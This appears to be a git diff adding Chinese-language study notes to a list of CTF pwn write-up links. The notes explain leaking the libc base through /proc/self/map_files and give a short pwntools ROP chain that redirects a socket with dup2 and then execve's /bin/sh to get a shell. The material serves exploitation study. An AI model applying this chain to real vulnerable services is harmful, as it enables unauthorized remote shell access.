@@ -957,3 +957,16 @@ sc = jmpsc + b"\x00" * (0x50 - len(jmpsc)) + realsc
 ```
 84. [ex](https://nootkroot.github.io/posts/ex-hsctf-2023/)
 - ret2libc复习。当题目没有给出使用的libc时，可以多泄露几个got地址再去libc-database里面查，保证只剩下一个可能的libc版本。
+85. [baby-ROP-but-unexploitable](https://github.com/n132/CTF-Write-Up/tree/main/2023-GPNCTF/baby-ROP-but-unexploitable)
+- `/proc/self/map_files`是一个目录，但是里面的文件名记录着libc等文件的内存映射，意味着可以通过里面的文件名直接获取libc base，而无需读取文件内容。
+- ROP获取反弹shell。一种方法已经记录在wp里了，也可以像下面这样：
+  ```py
+  #https://ctftime.org/writeup/37175
+  rop = ROP(libc)
+  # rop.close(0)
+  # rop.close(1)
+  rop.dup2(4, 0)
+  rop.rsi = 1
+  rop.dup2()
+  rop.execve(next(libc.search(b"/bin/sh")), 0, 0)
+  ```
